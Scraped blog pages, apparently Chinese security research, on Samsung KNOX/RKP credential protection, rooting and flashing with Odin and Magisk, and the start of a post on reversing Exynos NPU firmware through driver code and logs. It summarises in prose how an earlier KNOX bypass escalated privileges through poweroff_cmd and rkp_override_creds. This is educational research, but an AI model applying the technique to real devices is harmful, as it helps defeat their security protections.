\</span></span><br><span class="line"><span class="meta">	do &#123;							\</span></span><br><span class="line"><span class="meta">		struct security_hook_list *P;			\</span></span><br><span class="line"><span class="meta">								\</span></span><br><span class="line"><span class="meta">		<span class="keyword">if</span>(security_integrity_current()) break;	\</span></span><br><span class="line"><span class="meta">		list_for_each_entry(P, &amp;security_hook_heads.FUNC, list)	\</span></span><br><span class="line"><span class="meta">			P-&gt;hook.FUNC(__VA_ARGS__);		\</span></span><br><span class="line"><span class="meta">	&#125; while (0)</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> call_int_hook(FUNC, IRC, ...) (&#123;			\</span></span><br><span class="line"><span class="meta">	int RC = IRC;						\</span></span><br><span class="line"><span class="meta">	do &#123;							\</span></span><br><span class="line"><span class="meta">		struct security_hook_list *P;			\</span></span><br><span class="line"><span class="meta">								\</span></span><br><span class="line"><span class="meta">		RC = security_integrity_current();		\</span></span><br><span class="line"><span class="meta">		<span class="keyword">if</span> (RC != 0)							\</span></span><br><span class="line"><span class="meta">			break;								\</span></span><br><span class="line"><span class="meta">		list_for_each_entry(P, &amp;security_hook_heads.FUNC, list) &#123; \</span></span><br><span class="line"><span class="meta">			RC = P-&gt;hook.FUNC(__VA_ARGS__);		\</span></span><br><span class="line"><span class="meta">			<span class="keyword">if</span> (RC != 0)				\</span></span><br><span class="line"><span class="meta">				break;				\</span></span><br><span class="line"><span class="meta">		&#125;						\</span></span><br><span class="line"><span class="meta">	&#125; while (0);						\</span></span><br><span class="line"><span class="meta">	RC;							\</span></span><br><span class="line"><span class="meta">&#125;)</span></span><br><span class="line"></span><br><span class="line">...</span><br><span class="line">  </span><br><span class="line"><span class="comment">// security/selinux/hooks.c</span></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">security_integrity_current</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="built_in">rcu_read_lock</span>();</span><br><span class="line">	<span class="keyword">if</span> ( rkp_cred_enable &amp;&amp; </span><br><span class="line">		(<span class="built_in">rkp_is_valid_cred_sp</span>((u64)<span class="built_in">current_cred</span>(),(u64)<span class="built_in">current_cred</span>()-&gt;security)||</span><br><span class="line">		<span class="built_in">cmp_sec_integrity</span>(<span class="built_in">current_cred</span>(),current-&gt;mm)||</span><br><span class="line">		<span class="built_in">cmp_ns_integrity</span>())) &#123;</span><br><span class="line">		<span class="built_in">rkp_print_debug</span>();</span><br><span class="line">		<span class="built_in">rcu_read_unlock</span>();</span><br><span class="line">		<span class="built_in">panic</span>(<span class="string">&quot;RKP CRED PROTECTION VIOLATION\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="built_in">rcu_read_unlock</span>();</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>如果启用了CONFIG_RKP_KDP，则security_integrity_current函数生效，security_integrity_current函数将用于校验进程的cred安全上下文。简单来讲，它将做以下几件事：</p>
<ol>
<li>进程描述符中的cred和安全性是否在RKP保护的只读内存区域中进行分配。</li>
<li>bp_cred和cred是否始终不允许被修改。</li>
<li>bp_task是否是这个进程。</li>
<li>mm-&gt;pgd和cred-&gt;bp_pgd是否不变。</li>
<li>current-&gt;nsproxy-&gt;mnt_ns-&gt;root和current-&gt;nsproxy-&gt;mnt_ns-&gt;root -&gt;mnt-&gt;bp_mount是否不变。</li>
</ol>
<p>三星还将SELinux相关的数据，如cred-&gt;security，task_security_struct和selinux_ops放在RKP保护的只读内存区域中，以阻止攻击者通过AAW原语进行修改。</p>
<p>以上是关于三星自定义的SELinux的功能的简要描述。</p>
<p>SELinux还有一些其他作用，它可以用于评估漏洞，比如，在isolated_app上下文中触发的漏洞，比在untrusted_app上下文中触发的漏洞要更有价值。</p>
<p>我们可以通过检查以下命令，来查看这个信息</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">adb pull /sys/fs/selinux/policy</span><br><span class="line">sesearch --allow policy |  grep -v <span class="string">&quot;magisk&quot;</span> |  grep <span class="string">&quot;isolated_app&quot;</span></span><br></pre></td></tr></table></figure>

<h2 id="历史三星Galaxy漏洞利用"><a href="#历史三星Galaxy漏洞利用" class="headerlink" title="历史三星Galaxy漏洞利用"></a>历史三星Galaxy漏洞利用</h2><p>之前的KNOX绕过漏洞利用，又一个很好的文章<a target="_blank" rel="noopener" href="http://powerofcommunity.net/poc2019/x82.pdf">x82’s slide at POC 2019</a>。</p>
<h3 id="KNOX2-6（Samsung-Galaxy-S7）"><a href="#KNOX2-6（Samsung-Galaxy-S7）" class="headerlink" title="KNOX2.6（Samsung Galaxy S7）"></a>KNOX2.6（Samsung Galaxy S7）</h3><p><a target="_blank" rel="noopener" href="https://www.blackhat.com/docs/us-17/thursday/us-17-Shen-Defeating-Samsung-KNOX-With-Zero-Privilege-wp.pdf">blackhat USA 2017 slide from KeenLab</a>，给出了新的绕过DFI和SELinux的方式。</p>
<p>首先，调用 <code>rkp_override_creds</code> 以一些复杂的方式去覆盖自己的cred，尽管RKP在 <code>rkp_override_creds</code>中执行来 <code>uid_checking</code>。 然后使用 <code>orderly_poweroff</code> 函数，结合修改过的 <code>poweroff_cmd</code> 去调用 <code>call_usermodehelper</code> 函数，去创建高权限进程。因此，在获取到拥有高权限的进程之后，再调用 <code>rkp_override_creds</code> 去更改它的cred信息。</p>
<h3 id="KNOX2-8（Samsung-Galaxy-S8）"><a href="#KNOX2-8（Samsung-Galaxy-S8）" class="headerlink" title="KNOX2.8（Samsung Galaxy S8）"></a>KNOX2.8（Samsung Galaxy S8）</h3><h1 id="下载模式"><a href="#下载模式" class="headerlink" title="下载模式"></a>下载模式</h1><p>关机，然后，插入USB，同时按住音量下键+bixy键，出现警告页面，按音量上键确认。操作有点玄学，可能得多试几次。</p>
<h1 id="刷机"><a href="#刷机" class="headerlink" title="刷机"></a>刷机</h1><p>插入USB前，应提前打开奥丁。然后同时按住Bixy+电源下键+电源键；按住的一瞬间插入USB；出现提示页面后按电源上键进入下载页面。</p>
<p>在奥丁中，选择对应开头的的文件即可，AP选择patch的magisk包。</p>
<p>开始即可。</p>
<p>拨号输入*#1234#，看版本号，左数起数字后45位，如SX就是版本号，SX&#x3D;UX没区别，不同版本会有两种字母显示。</p>
<h1 id="固件包内容"><a href="#固件包内容" class="headerlink" title="固件包内容"></a>固件包内容</h1><table>
<thead>
<tr>
<th><strong>BL(Bootloader)</strong> <strong>：</strong></th>
<th>代表 <strong>引导程序</strong></th>
</tr>
</thead>
<tbody><tr>
<td><strong>AP (Application Processor or PDA)</strong></td>
<td>表示<strong>Android系统</strong>（可能代表Android系统分区）; 在之前的Odin版本中，这被称为“PDA”</td>
</tr>
<tr>
<td><strong>CP(Core Processor）</strong></td>
<td>代表 <strong>调制解调器</strong></td>
</tr>
<tr>
<td><strong>CSC(Co numer Software Customization)</strong></td>
<td>代表 <strong>消费者软件定制</strong>，它包含特定于该地区的软件包，运营商品牌和APN设置（就像不同的运营商的数据接入点名称不通）。</td>
</tr>
<tr>
<td><strong>PIT (Partition Information Table)</strong></td>
<td>代表 <strong>分区信息表</strong>，如果你搞砸分区表，或者由于分区表布局的变化，你只需要用它就好了。</td>
</tr>
</tbody></table>
<p>如果想要完全刷掉手机，使用CSC，如果想要保留数据，使用HOME_CSC。</p>
<p>直接解压AP，后缀lz4表示是使用lz4进行压缩的，解压使用<code>lz4 -d system.img.lz4</code>。</p>
<h2 id="boot-img"><a href="#boot-img" class="headerlink" title="boot.img"></a>boot.img</h2><p>包含两部分，分别为<em>kernel</em> 和ramdisk。</p>
<h2 id="dtbo-img"><a href="#dtbo-img" class="headerlink" title="dtbo.img"></a>dtbo.img</h2><p>设备树镜像，BootLoader（通常是uboot）一般与dtb文件相配合，以告知Linux有关驱动节点。</p>
<h2 id="recovery-img"><a href="#recovery-img" class="headerlink" title="recovery.img"></a>recovery.img</h2><p>从本质上说，<code>recovery.img</code>和<code>boot.img</code>基本一样。这就意味着，<code>recovery.img</code>也是Linux内核（<code>zImage</code>）和内存磁盘镜像（<code>ramdisk.img</code>）组成的。这两个镜像中的Linux内核是完全一样的，区别只是ramdisk.img中的少部分文件存在差异：</p>
<p><strong>最主要的差异是recovery.img和ramdisk.img中的sbin目录中多了一个recovery命令进入Recovery主界面，而不会正常启动Android系统。</strong></p>
<p>实现的原理是：</p>
<ul>
<li>Recovery.img和boot.img在自己的分区各自有一个Linux内核（zImage），彼此的Linux内核调用的init命令解析的init.rc及其相关文件的内容有一定的差异。</li>
<li>而Bootloader根据用户的选择决定使用boot.img中Linux内核，还是使用Recovery.img中的Linux内核启动系统。如果使用前者，Android系统就会正常启动，如果使用后者，就会进入Recovery选择菜单，所以recovery.img和boot.img的第二个差异就是其中的init.rc及其相关配置文件的内容略有不同。</li>
</ul>
<p>从前面的描述还可以看出，<code>recovery.img</code>和<code>boot.img</code>其实都是一个最小的运行系统，也就是说他们都各自带一个满足最低要求的运行环境（<code>ramdisk.img</code>）。<code>boot.img</code>利用这个运行环境监理更大的运行环境（<code>system.img</code>） ，而<code>recovery.img</code>就直接使用了这个运行环境进行基本的操作（复制文件、删除文件、加压文件、mount等），这些操作也就是Recovery模式下刷机要进行的一些操作。</p>
<h2 id="cache-img"><a href="#cache-img" class="headerlink" title="cache.img"></a>cache.img</h2><p>缓存镜像用于存储系统或用户应用产生的临时数据，通常的镜像文件名为chche.img。</p>
<p>一般ROM并不需要包含缓存镜像。</p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://buffer0verflooow.github.io/2022/04/15/%E9%80%86%E5%90%91%E4%B8%89%E6%98%9FNPU%E5%9B%BA%E4%BB%B6%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="buffer0verflooow">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="buffer0verflooow - Blog">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | buffer0verflooow - Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/2022/04/15/%E9%80%86%E5%90%91%E4%B8%89%E6%98%9FNPU%E5%9B%BA%E4%BB%B6%E5%8F%8A%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/" class="post-title-link" itemprop="url">逆向三星NPU固件及漏洞利用</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">Posted on</span>
      

      <time title="Created: 2022-04-15 20:50:44 / Modified: 20:52:27" itemprop="dateCreated datePublished" datetime="2022-04-15T20:50:44+08:00">2022-04-15</time>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><blockquote>
<p>与以往的的Galaxy S系列相同，三星Galaxy S10系列新机继续使用双处理器策略：在中国、美国、拉丁美洲、日本等国家和地区使用骁龙855处理器，而在其他地区采用三星自家的Exynos 9820处理器。</p>
</blockquote>
<h2 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h2><blockquote>
<p>神经处理器或者神经处理单元(NPU)是一个特殊的电路组件，它实现了所有运行机器学习算法所需的控制和算术逻辑，典型的是执行预测模型，比如人工神经网络ANN或随机森林RF。</p>
</blockquote>
<p>截至2021&#x2F;8&#x2F;11，三星共发布了8款NPU固件：</p>
<ul>
<li>Exynos 880</li>
<li>Exynos 9820</li>
<li>Exynos 9825</li>
<li>Exynos 980</li>
<li>Exynos 990</li>
<li>Exynos 1080</li>
<li>Exynos 2100</li>
<li>Exynos Auto V9</li>
</ul>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Exynos#Exynos_9800_series_(2018/19)">https://en.wikipedia.org/wiki/Exynos#Exynos_9800_series_(2018/19)</a></p>
</blockquote>
<p><em>以下主要以Galaxy S20的Exynos 990为例进行示范。一个单独的固件通常具有很大的攻击面，PZ公布了很多关于三星NPU的<a target="_blank" rel="noopener" href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2073">漏洞利用</a>。</em></p>
<p>自测：S10 G9730ZCU5FUC2</p>
<h2 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h2><p>分析基于Galaxy S20 <code>SM-G980F</code>，固件版本<a target="_blank" rel="noopener" href="https://www.sammobile.com/samsung/galaxy-s20/firmware/SM-G980F/XEF/download/G980FXXS5CTL5/1117440/">G980FXXS5CTL5</a>。首先需要获取设备的root权限，否则无法访问dmesg和NPU驱动。</p>
<p>三星通常会在开发时加入大量的调试信息，NPU也不例外，dmesg中关于NPU驱动和固件的log信息十分丰富。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">x1s:/ <span class="comment"># sysctl -w kernel.kptr_restrict=1</span></span><br><span class="line">x1s:/ <span class="comment"># dmesg -w | grep &quot;NPU:&quot;</span></span><br><span class="line">[102.037911] [Exynos][NPU][NOTICE]: NPU:[*]npu_debug_open(221):start <span class="keyword">in</span> npu_debug open</span><br><span class="line">[102.037928] [Exynos][NPU][NOTICE]: NPU:[*]npu_debug_open(222):complete <span class="keyword">in</span> npu_debug open</span><br><span class="line">[102.037936] [Exynos][NPU][NOTICE]: NPU:[*]npu_log_open(1335):start <span class="keyword">in</span> npu_log_open</span><br><span class="line">[102.037943] [Exynos][NPU][NOTICE]: NPU:[*]npu_log_open(1336):complete <span class="keyword">in</span> npu_log_open</span><br><span class="line">[102.037951] [Exynos][NPU][NOTICE]: NPU:[*]npu_util_memdump_open(319):start <span class="keyword">in</span> npu_util_memdump_open</span><br><span class="line">[102.037958] [Exynos][NPU][NOTICE]: NPU:[*]npu_util_memdump_open(344):complete <span class="keyword">in</span> npu_util_memdump_open</span><br><span class="line">[102.037966] [Exynos][NPU][NOTICE]: NPU:[*]npu_scheduler_open(1458):<span class="keyword">done</span></span><br><span class="line">[102.039801] [Exynos][NPU][NOTICE]: NPU:[*]npu_system_resume(387):wake_lock, now(1)</span><br><span class="line">[102.039813] [Exynos][NPU][NOTICE]: NPU:[*]npu_system_alloc_fw_dram_log_buf(93):start: initialization.</span><br><span class="line">[102.040957] [Exynos][NPU][NOTICE]: NPU:[*]npu_system_alloc_fw_dram_log_buf(103):DRAM <span class="built_in">log</span> buffer <span class="keyword">for</span> kernel: size(2097152) / dv(0x0000000080000000) / kv(ffffff802ca85000)</span><br></pre></td></tr></table></figure>

<p>debugfs项也可以用来查看一些NPU信息：</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">x1s:/ <span class="comment"># ls -la /d/npu/</span></span><br><span class="line">total 0</span><br><span class="line">drwxr-xr-x  2 root   root   0 2021-01-30 18:18 .</span><br><span class="line">drwxr-xr-x 63 system system 0 1970-01-01 01:00 ..</span><br><span class="line">-rw-------  1 root   root   0 2021-01-30 18:21 SRAM-IDP</span><br><span class="line">-rw-------  1 root   root   0 2021-01-30 18:21 SRAM-TCU</span><br><span class="line">-r--------  1 root   root   0 2021-01-30 18:18 dev-log</span><br><span class="line">-r--------  1 root   root   0 2021-01-30 18:21 fw-log-SRAM</span><br><span class="line">-r--------  1 root   root   0 2021-01-30 18:18 fw-profile</span><br><span class="line">-r--------  1 root   root   0 2021-01-30 18:18 fw-report</span><br><span class="line">-rw-------  1 root   root   0 2021-01-30 18:18 idiot</span><br><span class="line">-r--------  1 root   root   0 2021-01-30 18:18 proto-drv-dump</span><br><span class="line">-r--------  1 root   root   0 2021-01-30 18:18 result-golden-match</span><br><span class="line">--w-------  1 root   root   0 2021-01-30 18:18 set-golden-desc</span><br></pre></td></tr></table></figure>

<h2 id="初始化NPU和加载NPU固件"><a href="#初始化NPU和加载NPU固件" class="headerlink" title="初始化NPU和加载NPU固件"></a>初始化NPU和加载NPU固件</h2><h3 id="加载NPU驱动"><a href="#加载NPU驱动" class="headerlink" title="加载NPU驱动"></a>加载NPU驱动</h3><p>本节主要介绍NPU驱动是怎样被内核启动的，以及固件加载的相关操作。</p>
<p><em>初始化操作是在<a target="_blank" rel="noopener" href="https://github.com/LongtermSecurityInc/samsung_kernel_sm-g980f/blob/master/drivers/vision/npu/core/npu-device.c">drivers&#x2F;vision&#x2F;npu&#x2F;core&#x2F;npu-device.c</a>中定义的，内核在启动时调用<a target="_blank" rel="noopener" href="https://github.com/LongtermSecurityInc/samsung_kernel_sm-g980f/blob/master/drivers/vision/npu/core/npu-device.c#L737"><code>npu_device_init()</code></a>函数。</em></p>
<p>自测：drivers&#x2F;media&#x2F;platform&#x2F;msm目录下的npu文件夹中。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* -------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment"> * Module Entry Points</span></span><br><span class="line"><span class="comment"> * -------------------------------------------------------------------------</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="function"><span class="type">static</span> <span class="type">int</span> __init <span class="title">npu_init</span><span class="params">(<span class="type">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span> rc;</span><br><span class="line"></span><br><span class="line">	rc = <span class="built_in">platform_driver_register</span>(&amp;npu_driver);</span><br><span class="line">	<span class="keyword">if</span> (rc)</span><br><span class="line">		<span class="built_in">NPU_ERR</span>(<span class="string">&quot;register failed %d\n&quot;</span>, rc);</span><br><span class="line">	<span class="keyword">return</span> rc;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>npu_init()调用platform_driver_register()函数，参数为struct platform_driver类型。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">struct</span> <span class="title class_">platform_driver</span> npu_driver = &#123;</span><br><span class="line">    .probe  = npu_device_probe,</span><br><span class="line">    .remove = npu_device_remove,</span><br><span class="line">    .driver = &#123;</span><br><span class="line">        .name   = <span class="string">&quot;exynos-npu&quot;</span>,</span><br><span class="line">        .owner  = THIS_MODULE,</span><br><span class="line">        .pm = &amp;npu_pm_ops,</span><br><span class="line">        .of_match_table = <span class="built_in">of_match_ptr</span>(exynos_npu_match),</span><br><span class="line">    &#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>自测：</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">struct</span> <span class="title class_">platform_driver</span> npu_driver = &#123;</span><br><span class="line">	.probe = npu_probe,</span><br><span class="line">	.remove = npu_remove,</span><br><span class="line">	.driver = &#123;</span><br><span class="line">		.name = <span class="string">&quot;msm_npu&quot;</span>,</span><br><span class="line">		.of_match_table = npu_dt_match,</span><br><span class="line">		.pm = &amp;npu_pm_ops,</span><br><span class="line">	&#125;,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">of_device_id</span> npu_dt_match[] = &#123;</span><br><span class="line">	&#123; .compatible = <span class="string">&quot;qcom,msm-npu&quot;</span>,&#125;,</span><br><span class="line">	&#123;&#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>当内核加载NPU模块时，<em>npu_device_probe()函数会被调用</em>，自测：npu_probe()，</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">static</span> <span class="type">int</span> <span class="title">npu_device_probe</span><span class="params">(<span class="keyword">struct</span> platform_device *pdev)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> ret = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">device</span> *dev;</span><br><span class="line">    <span class="keyword">struct</span> <span class="title class_">npu_device</span> *device;</span><br><span class="line"></span><br><span class="line">    dev = &amp;pdev-&gt;dev;</span><br><span class="line">    device = <span class="built_in">devm_kzalloc</span>(dev, <span class="built_in">sizeof</span>(*device), GFP_KERNEL);</span><br><span class="line">    device-&gt;dev = dev;</span><br><span class="line"></span><br><span class="line">    ret = <span class="built_in">npu_system_probe</span>(&amp;device-&gt;system, pdev);</span><br><span class="line">    ret = <span class="built_in">npu_debug_probe</span>(device);</span><br><span class="line">    ret = <span class="built_in">npu_log_probe</span>(device);</span><br><span class="line">    ret = <span class="built_in">npu_vertex_probe</span>(&amp;device-&gt;vertex, dev);</span><br><span class="line">    ret = <span class="built_in">proto_drv_probe</span>(device);</span><br><span class="line">    ret = <span class="built_in">npu_sessionmgr_probe</span>(&amp;device-&gt;sessionmgr);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_NPU_GOLDEN_MATCH</span></span><br><span class="line">    ret = <span class="built_in">register_golden_matcher</span>(dev);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> CONFIG_NPU_LOOPBACK</span></span><br><span class="line">    ret = <span class="built_in">mailbox_mgr_mock_probe</span>(device);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    ret = <span class="built_in">npu_profile_probe</span>(&amp;device-&gt;system);</span><br><span class="line">    ret = <span class="built_in">iovmm_activate</span>(dev);</span><br><span class="line">    <span class="built_in">iovmm_set_fault_handler</span>(dev, npu_iommu_fault_handler, device);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">dev_set_drvdata</span>(dev, device);</span><br><span class="line"></span><br><span class="line">    ret = <span class="number">0</span>;</span><br><span class="line">    <span class="built_in">probe_info</span>(<span class="string">&quot;complete in %s\n&quot;</span>, __func__);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">goto</span> ok_exit;</span><br><span class="line"></span><br><span class="line">err_exit:</span><br><span class="line">    <span class="built_in">probe_err</span>(<span class="string">&quot;error on %s ret(%d)\n&quot;</span>, __func__, ret);</span><br><span class="line">ok_exit:</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>npu_device_probe初始化以下组件：</p>
<ul>
<li>中断(使用相关的DTS file)</li>
<li>映射共享内存</li>
<li>映射相关IO设备</li>
<li>npu 接口和mailbox</li>
<li>二进制固件路径<ul>
<li><code>/data/NPU.bin</code> 和<code>/vendor/firmware/NPU.bin</code></li>
<li>如果上述两个路径不存在，设备将从内核镜像的 <code>npu/NPU.bin</code>中加载</li>
</ul>
</li>
<li>debugfs项</li>
<li>vertex对象<ul>
<li>除其他事情外，设置文件操作和ioctl处理函数：<ul>
<li><strong>File operations</strong>: <a target="_blank" rel="noopener" href="https://github.com/LongtermSecurityInc/samsung_kernel_sm-g980f/blob/master/drivers/vision/npu/core/npu-vertex.c#L315"><code>npu_vertex_fops</code></a></li>
<li><strong>Ioctl handlers</strong>: <a target="_blank" rel="noopener" href="https://github.com/LongtermSecurityInc/samsung_kernel_sm-g980f/blob/master/drivers/vision/npu/core/npu-vertex.c#L884"><code>npu_vertex_ioctl_ops</code></a></li>
</ul>
</li>
</ul>
</li>
<li>session manager</li>
<li>iovmm</li>
</ul>
<h2 id="NPU驱动电源管理和固件加载"><a href="#NPU驱动电源管理和固件加载" class="headerlink" title="NPU驱动电源管理和固件加载"></a>NPU驱动电源管理和固件加载</h2><p>前面提到的npu_driver还注册了npu_pm_ops作为它的电源管理操作处理程序。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">const</span> <span class="keyword">struct</span> <span class="title class_">dev_pm_ops</span> npu_pm_ops = &#123;</span><br><span class="line">    <span class="built_in">SET_SYSTEM_SLEEP_PM_OPS</span>(npu_device_suspend, npu_device_resume)</span><br><span class="line">    <span class="built_in">SET_RUNTIME_PM_OPS</span>(npu_device_runtime_suspend, npu_device_runtime_resume, <span class="literal">NULL</span>)</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

<p>当设备需要启动NPU，将调用电源管理系统的npu_device_runtime_resume()函数，然后调用npu_system_resume()函数。</p>
<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">npu_system_resume</span><span class="params">(<span class="keyword">struct</span> npu_system *system, u32 mode)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">/* [...] */</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Loads the firmware in memory from the filesystem */</span></span><br><span class="line">    ret = <span class="built_in">npu_firmware_load</span>(system);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Starts the NPU firmware */</span></span><br><span class="line">    ret = <span class="built_in">npu_system_soc_resume</span>(system, mode);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Opens an interface to the NPU */</span></span><br><span class="line">    ret = <span class="built_in">npu_interface_open</span>(system);</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* [...] */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>npu_firmware_load调用npu_firmware_file_read函数，npu_firmware_file_read函数尝试从&#x2F;data&#x2F;NPU.bin 或 &#x2F;vendor&#x2F;firmware&#x2F;NPU.bin中读取固件，如果这两个路径都没有，则从npu&#x2F;NPU.bin中读取。文件中的内容接下来会被拷贝到system-&gt;fw_npu_memory_buffer-&gt;vaddr中的iomem区域中。</p>
<p>固件所在的iomem时FW_DRAM，改区域在驱动初始化时由init_iomem_area()函数，根据arch&#x2F;arm64&#x2F;boot&#x2F;dts&#x2F;exynos&#x2F;exynos9830.dts进行定义。在NPU地址空间中，这个区域始于物理地址0x50000000，大小为0xe0000。内核中相关的地址时动态分配的。</p>
<p>最后，npu_system_soc_resume()通过调用npu_cpu_on()函数启动NPU。</p>
<p>NPU随&#x2F;dev&#x2F;vertex10启动而启动，关闭而关闭。当打开这个设备时，在dmesg中可以看到：</p>
